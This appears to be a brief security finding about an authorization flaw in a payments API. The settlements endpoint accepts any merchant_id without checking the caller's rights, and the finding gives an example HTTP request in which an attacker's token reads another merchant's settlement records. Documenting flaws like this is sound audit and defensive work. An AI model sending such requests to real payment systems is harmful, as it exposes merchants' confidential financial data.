diagnosis: The endpoint allows client callers to browse settlement records via LimitOffsetPagination by supplying ?merchant_id=X without ensuring that request.user is authorized for that merchant. Any user can review settlement totals and transaction deductions of other merchants.
exploit_request:
GET /api/settlements/?merchant_id=8832&limit=50&offset=0 HTTP/1.1
Host: gateway.payments.example
Authorization: Bearer <attacker_jwt>
